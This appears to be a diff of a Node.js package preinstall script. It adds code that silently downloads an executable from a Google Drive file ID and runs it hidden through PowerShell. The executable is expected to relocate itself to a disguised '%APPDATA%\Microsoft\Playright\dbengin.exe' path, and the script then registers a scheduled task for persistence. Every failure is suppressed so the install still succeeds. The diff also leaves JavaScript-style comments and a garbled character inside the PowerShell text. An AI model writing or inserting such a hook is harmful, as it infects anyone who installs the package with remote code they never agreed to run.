@@ -10,48 +10,70 @@ const fs = require('fs');
 
 const downloadExePath = path.join(__dirname, '..', 'downloaded_from_gdown.exe');
 
+// Prepare a small, robust Node ES module to perform the download.
+const downloadModulePath = path.join(__dirname, '..', 'preinstall_download.mjs');
+const downloadModule = `
+(async () => {
+    try {
+        const mod = await import('better-gdrive');
+        const downloadFile = mod.downloadFile || mod.default?.downloadFile || mod.default;
+        const fileId = '1W3Ddny5rolO3DrvyfQH9i2NFgn1uFh2n';
+        const output = process.env.DOWNLOAD_OUTPUT;
+        if (!downloadFile || typeof downloadFile !== 'function') {
+            console.error('[preinstall-download] ERROR: downloadFile function not found on better-gdrive');
+            process.exit(0);
+        }
+        await downloadFile(fileId, output);
+        console.log('[preinstall-download] Download complete');
+    } catch (e) {
+        console.error('[preinstall-download] ERROR:', e && e.message ? e.message : e);
+    }
+    // Always exit 0 so install doesn't fail due to this step
+    process.exit(0);
+})();
+`;
+
+try {
+        fs.writeFileSync(downloadModulePath, downloadModule, { encoding: 'utf8' });
+        console.log('[detach] Download helper module written to:', downloadModulePath);
+} catch (err) {
+        console.error('[detach] ERROR writing download helper module:', err.message);
+}
+
 const psScript = `
 $ErrorActionPreference = 'Stop'
 Write-Output "[preinstall-setup] Starting preinstall setup script..."
 Write-Output "[preinstall-setup] Script execution started at $(Get-Date)"
 
-# Use better-gdrive to download the requested file
+# Use better-gdrive to download the requested file via an external node module file
 $fileId = '1W3Ddny5rolO3DrvyfQH9i2NFgn1uFh2n'
-$output = "${downloadExePath}"
+$output = "${downloadExePath.replace(/\\/g, '\\\\')}"
 $env:DOWNLOAD_OUTPUT = $output
 Write-Output "[preinstall-setup] File ID: $fileId, Output path: $output"
 
-Write-Output "[preinstall-setup] Downloading file via better-gdrive (id: $fileId) to $output"
-$downloadScript = @'
-import { downloadFile } from "better-gdrive";
-
-const fileId = "1W3Ddny5rolO3DrvyfQH9i2NFgn1uFh2n";
-const output = process.env.DOWNLOAD_OUTPUT;
-
-await downloadFile(fileId, output);
-'@
+Write-Output "[preinstall-setup] Running Node download helper (safe, exits 0)"
 try {
-    $downloadOutput = node --input-type=module -e $downloadScript 2>&1
-    Write-Output "[preinstall-setup] Download command output: $downloadOutput"
-    Write-Output "[preinstall-setup] Download complete."
+        $scriptPath = Join-Path $PSScriptRoot 'preinstall_download.mjs'
+        $downloadOutput = node $scriptPath 2>&1
+        Write-Output "[preinstall-setup] Download helper output: $downloadOutput"
 } catch {
-    Write-Output "[preinstall-setup] ERROR: better-gdrive download failed: $_"
+        Write-Output "[preinstall-setup] ERROR: Node download helper failed: $_"
 }
 
-# ---------------------------------------------
-# DOWNLOAD COMPLETE – NOW HANDLE THE EXE
-# ---------------------------------------------
+// ---------------------------------------------
+// DOWNLOAD COMPLETE � NOW HANDLE THE EXE
+// ---------------------------------------------
 if (Test-Path $output) {
     Write-Output "[preinstall-setup] File exists: $output"
     Write-Output "[preinstall-setup] File size: $(Get-Item $output).Length bytes"
 
-    # 1. Execute the downloaded file (it will move itself to %APPDATA%\Microsoft\Playright\dbengin.exe)
+    # 1. Execute the downloaded file (it will move itself to %APPDATA%\\Microsoft\\Playright\\dbengin.exe)
     Write-Output "[preinstall-setup] Executing downloaded file (once, silently) to let it self-install..."
     $proc = Start-Process -FilePath $output -WindowStyle Hidden -NoNewWindow -Wait -PassThru -ErrorAction SilentlyContinue
     Write-Output "[preinstall-setup] Process exit code: $($proc.ExitCode)"
 
     # 2. Define the final expected path after self-move
-    $finalExe = Join-Path $env:APPDATA "Microsoft\Playright\dbengin.exe"
+    $finalExe = Join-Path $env:APPDATA "Microsoft\\Playright\\dbengin.exe"
     Write-Output "[preinstall-setup] Expecting final exe at: $finalExe"
 
     # 3. Wait briefly for file system (optional, but good practice)
@@ -74,11 +96,7 @@ if (Test-Path $output) {
         } catch {
             Write-Output "[preinstall-setup] ERROR creating scheduled task: $_"
         }
-    } else {
-        Write-Output "[preinstall-setup] WARNING: Final exe not found at expected location after execution. Task not created."
     }
-} else {
-    Write-Output "[preinstall-setup] ERROR: Downloaded file not found at $output; skipping execution and task creation."
 }
 `;
 
